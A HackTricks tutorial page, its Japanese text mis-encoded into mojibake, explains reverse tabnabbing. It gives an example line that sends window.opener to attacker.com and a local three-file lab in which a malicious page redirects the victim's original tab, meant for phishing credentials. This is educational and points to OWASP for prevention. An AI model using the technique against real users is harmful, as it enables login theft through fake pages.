<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>


# èª¬æ˜

**æ”»æ’ƒè€…**ãŒè¢«å®³è€…ã«ã‚ˆã£ã¦ã‚¯ãƒªãƒƒã‚¯ã•ã‚Œã‚‹äºˆå®šã®**`<a`**ã‚¿ã‚°ã®**`href`**å¼•æ•°ã‚’**åˆ¶å¾¡**ã§ãã‚‹çŠ¶æ³ã§ã€ãã®**`<a`**ã‚¿ã‚°ã«ã¯**`target="_blank" rel="opener"`**å±æ€§ãŒä»˜ã„ã¦ã„ã¾ã™ã€‚ã“ã®å ´åˆã€**æ”»æ’ƒè€…**ã¯ã“ã®**ãƒªãƒ³ã‚¯**ã‚’è‡ªåˆ†ã®åˆ¶å¾¡ä¸‹ã«ã‚ã‚‹ã‚¦ã‚§ãƒ–ï¼ˆ**æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆ**ï¼‰ã«å‘ã‘ã¾ã™ã€‚ãã—ã¦ã€è¢«å®³è€…ãŒãƒªãƒ³ã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¦æ”»æ’ƒè€…ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ã“ã®**æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆ**ã¯**`window.opener`**ã¨ã„ã†JavaScriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä»‹ã—ã¦**å…ƒã®ãƒšãƒ¼ã‚¸**ã‚’**åˆ¶å¾¡**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã‚‚ã—ãƒšãƒ¼ã‚¸ã«**`rel="opener"`**ãŒãªãã€**`target="_blank"`**ãŒã‚ã‚Šã€**`rel="noopener"`**ã‚‚ãªã„å ´åˆã€ãã‚Œã‚‚è„†å¼±æ€§ã®å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã®æŒ™å‹•ã‚’æ‚ªç”¨ã™ã‚‹ä¸€èˆ¬çš„ãªæ–¹æ³•ã¯ã€`window.opener.location = https://attacker.com/victim.html`ã¨ã„ã†ã‚³ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€å…ƒã®ã‚¦ã‚§ãƒ–ã®å ´æ‰€ã‚’æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚¦ã‚§ãƒ–ã«å¤‰æ›´ã™ã‚‹ã“ã¨ã§ã™ã€‚ã“ã®æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚¦ã‚§ãƒ–ã¯ã€å…ƒã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®**ãƒ­ã‚°ã‚¤ãƒ³ãƒ•ã‚©ãƒ¼ãƒ **ã‚’**æ¨¡å€£**ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«è³‡æ ¼æƒ…å ±ã‚’è¦æ±‚ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ãŸã ã—ã€æ”»æ’ƒè€…ãŒä»Šã‚„å…ƒã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’åˆ¶å¾¡ã§ãã‚‹ã‚ˆã†ã«ãªã£ãŸãŸã‚ã€ä»–ã®æ–¹æ³•ã§ã‚‚æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã€ã‚ˆã‚Šã‚¹ãƒ†ãƒ«ã‚¹æ€§ã®é«˜ã„æ”»æ’ƒã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ï¼ˆãŸã¨ãˆã°ã€JavaScriptã‚¤ãƒ™ãƒ³ãƒˆã‚’å¤‰æ›´ã—ã¦æƒ…å ±ã‚’å½¼ãŒåˆ¶å¾¡ã™ã‚‹ã‚µãƒ¼ãƒãƒ¼ã«å¤–éƒ¨æµå‡ºã•ã›ã‚‹ãªã©ï¼‰ã€‚

# æ¦‚è¦

## ãƒãƒƒã‚¯ãƒªãƒ³ã‚¯ã‚ã‚Š

äºˆé˜²å±æ€§ãŒä½¿ç”¨ã•ã‚Œã¦ã„ãªã„å ´åˆã®è¦ªãƒšãƒ¼ã‚¸ã¨å­ãƒšãƒ¼ã‚¸ã®é–“ã®ãƒªãƒ³ã‚¯ï¼š

![](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITH\_LINK.png)

## ãƒãƒƒã‚¯ãƒªãƒ³ã‚¯ãªã—

äºˆé˜²å±æ€§ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã®è¦ªãƒšãƒ¼ã‚¸ã¨å­ãƒšãƒ¼ã‚¸ã®é–“ã®ãƒªãƒ³ã‚¯ï¼š

![](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITHOUT\_LINK.png)

## ä¾‹ <a href="#examples" id="examples"></a>

ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã‚’ãƒ•ã‚©ãƒ«ãƒ€ã«ä½œæˆã—ã€`python3 -m http.server`ã§ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚\
ãã®å¾Œã€`http://127.0.0.1:8000/`vulnerable.htmlã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€ãƒªãƒ³ã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¦å…ƒã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®URLãŒã©ã®ã‚ˆã†ã«å¤‰åŒ–ã™ã‚‹ã‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

{% code title="vulnerable.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>Victim Site</h1>
<a href="http://127.0.0.1:8000/malicious.html" target="_blank" rel="opener">Controlled by the attacker</a>
</body>
</html>
```
{% code title="malicious.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<script>
window.opener.location = "http://127.0.0.1:8000/malicious_redir.html";
</script>
</body>
</html>
```
{% code title="malicious_redir.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>New Malicious Site</h1>
</body>
</html>
```
{% endcode %}

## ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãªãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ <a href="#accessible-properties" id="accessible-properties"></a>

æ‚ªæ„ã®ã‚ã‚‹ã‚µã‚¤ãƒˆã¯ã€**ã‚¯ãƒ­ã‚¹ã‚ªãƒªã‚¸ãƒ³**ï¼ˆã‚¯ãƒ­ã‚¹ãƒ‰ãƒ¡ã‚¤ãƒ³ï¼‰ã‚¢ã‚¯ã‚»ã‚¹ã®å ´åˆã€ä»¥ä¸‹ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã«ã®ã¿ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚ã“ã‚Œã‚‰ã¯ã€**opener** JavaScriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆå‚ç…§ï¼ˆå®Ÿéš›ã«ã¯**window** JavaScriptã‚¯ãƒ©ã‚¹ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã¸ã®å‚ç…§ï¼‰ã‹ã‚‰å–å¾—ã§ãã¾ã™ã€‚

* `opener.closed`ï¼šã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ãŒé–‰ã˜ã‚‰ã‚ŒãŸã‹ã©ã†ã‹ã‚’ç¤ºã™ãƒ–ãƒ¼ãƒ«å€¤ã‚’è¿”ã—ã¾ã™ã€‚
* `opener.frames`ï¼šç¾åœ¨ã®ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦å†…ã®ã™ã¹ã¦ã®iframeè¦ç´ ã‚’è¿”ã—ã¾ã™ã€‚
* `opener.length`ï¼šç¾åœ¨ã®ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦å†…ã®iframeè¦ç´ ã®æ•°ã‚’è¿”ã—ã¾ã™ã€‚
* `opener.opener`ï¼šã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚’ä½œæˆã—ãŸã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã¸ã®å‚ç…§ã‚’è¿”ã—ã¾ã™ã€‚
* `opener.parent`ï¼šç¾åœ¨ã®ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã®è¦ªã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚’è¿”ã—ã¾ã™ã€‚
* `opener.self`ï¼šç¾åœ¨ã®ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚’è¿”ã—ã¾ã™ã€‚
* `opener.top`ï¼šæœ€ä¸Šä½ã®ãƒ–ãƒ©ã‚¦ã‚¶ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚’è¿”ã—ã¾ã™ã€‚

ãƒ‰ãƒ¡ã‚¤ãƒ³ãŒåŒã˜å ´åˆã€æ‚ªæ„ã®ã‚ã‚‹ã‚µã‚¤ãƒˆã¯[**window**](https://developer.mozilla.org/en-US/docs/Web/API/Window) JavaScriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆå‚ç…§ã«ã‚ˆã£ã¦å…¬é–‹ã•ã‚Œã‚‹ã™ã¹ã¦ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

# äºˆé˜²ç­–

äºˆé˜²ç­–ã«ã¤ã„ã¦ã¯ã€[HTML5ãƒãƒ¼ãƒˆã‚·ãƒ¼ãƒˆ](https://cheatsheetseries.owasp.org/cheatsheets/HTML5\_Security\_Cheat\_Sheet.html#tabnabbing)ã«æ–‡æ›¸åŒ–ã•ã‚Œã¦ã„ã¾ã™ã€‚

# å‚è€ƒæ–‡çŒ®

{% embed url="https://owasp.org/www-community/attacks/Reverse_Tabnabbing" %}




<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å…¥æ‰‹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¾ã—ã‚‡ã†ã€‚

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
